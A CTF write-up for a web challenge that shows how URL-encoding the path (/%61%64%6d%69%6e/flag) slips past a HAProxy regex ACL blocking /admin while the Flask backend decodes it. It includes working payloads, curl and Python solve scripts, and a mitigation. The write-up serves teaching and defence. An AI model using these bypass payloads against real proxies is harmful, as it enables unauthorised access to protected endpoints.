# CTF Writeup: Borderline Personality

## ℹ️ Challenge Info

* **Event:** EHAX CTF
* **Category:** Web
* **Difficulty:** Easy
* **Description:** The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through.

---

## Summary

This challenge demonstrates a classic **reverse proxy bypass** using URL encoding. The `/admin/flag` endpoint is blocked at the proxy layer using an ACL rule in HAProxy, but the backend (Flask app) still exposes it. By sending a URL-encoded version of `/admin/flag`, we bypass the proxy filter and directly access the flag.

---

## Architecture Overview

**User** $\rightarrow$ **HAProxy** (Port 8080) $\rightarrow$ **Flask Backend** (Port 5000)

* **HAProxy** acts as a reverse proxy.
* It blocks `/admin` using a regex ACL.
* **Flask backend** still serves `/admin/flag`.
* This creates a trust mismatch between proxy and backend.

---

## Initial Discovery & Analysis

We are given access to: `http://chall.ehax.in:9098/`

Trying to directly access `http://chall.ehax.in:9098/admin/flag` results in: **Blocked / Denied**

### 🔎 Looking at HAProxy Configuration

```haproxy
frontend http-in
    bind *:8080
    
    acl restricted_path path -m reg ^/+admin
    http-request deny if restricted_path
    
    default_backend application_backend

```

> [!IMPORTANT]
> **🚨 Important Line:** `acl restricted_path path -m reg ^/+admin`
> This means: Match any path starting with `/admin`. If matched $\rightarrow$ deny request.

### 🔎 Looking at Backend (Flask)

```python
@app.route('/admin/flag', methods=['GET', 'POST'])
def flag():
    return "EHAX{TEST_FLAG}\n", 200

```

The backend does expose `/admin/flag`. The vulnerability is that the proxy blocks based on **raw path matching**, but the backend processes **decoded paths**.

---

## Understanding the Vulnerability

### 🔹 Reverse Proxy

A reverse proxy sits in front of the backend server and filters requests before forwarding them. Here, **HAProxy** is the gatekeeper using a regex to block `/admin`.

### 🔹 URL Encoding

URL encoding replaces characters with `%` followed by their ASCII hex value.

* **admin** $\rightarrow$ `%61%64%6d%69%6e`

### Why This Works

HAProxy checks the path **before** decoding.

* `/admin/flag` $\rightarrow$ **Blocked**
* `/%61%64%6d%69%6e/flag` $\rightarrow$ **NOT blocked** (The regex `^/+admin` does not match the literal string `%61...`)

However, **Flask** automatically decodes the URL before routing. When `/%61%64%6d%69%6e/flag` reaches Flask, it becomes `/admin/flag`.

**🔥 Result:** Proxy allows it, backend serves it. This is a classic **proxy normalization mismatch**.

---

## Exploitation / Solution Path

Try accessing the URL with the first character encoded:
`http://chall.ehax.in:9098/%61dmin/flag`

**Working Payloads:**

* **Path:** `/admin/flag` $\rightarrow$ Blocked
* **Path:** `/%61%64%6d%69%6e/flag` $\rightarrow$ **Works**
* **Path:** `/%61dmin/flag` $\rightarrow$ **Works**

### Solve Script

**Using curl:**

```bash
curl http://chall.ehax.in:9098/%61%64%6d%69%6e/flag

```

**Using Python:**

```python
import requests

url = "http://chall.ehax.in:9098/%61%64%6d%69%6e/flag"
r = requests.get(url)
print(r.text)

```

---

## Root Cause & Mitigation

### Root Cause

The vulnerability exists because there is no normalization consistency between the proxy and backend.

* URL normalization bypass
* Reverse proxy bypass
* Path encoding attack

### How to Fix It

Proper mitigation involves normalizing the URL **before** applying ACL checks:

```haproxy
http-request set-path %[path,decode]

```

## 🎓 Educational Appendix: Things to Learn

### 1. What is a Reverse Proxy?

A **Reverse Proxy** is a server that sits between client devices and a backend web server. It accepts requests from clients and forwards them to the appropriate backend. It is often used for load balancing, SSL termination, and security filtering. In this challenge, **HAProxy** was used to filter out "unauthorized" requests.

### 2. What is HAProxy?

**HAProxy** is a high-performance, open-source load balancer and proxy server for TCP and HTTP-based applications. It uses **ACLs (Access Control Lists)** to define flexible rules for routing or blocking traffic based on headers, paths, or IP addresses.

### 3. What is URL Encoding?

**URL Encoding** (or Percent-encoding) is a mechanism for encoding information in a Uniform Resource Identifier (URI). Characters that are not allowed in a URL, or characters that have special meaning, are replaced with a `%` followed by two hexadecimal digits.

* **Example:** The character `a` has a hex value of `61`, so it becomes `%61`.
* **The Lesson:** Security filters must always decode inputs before inspecting them, otherwise, a simple encoding change can bypass the filter.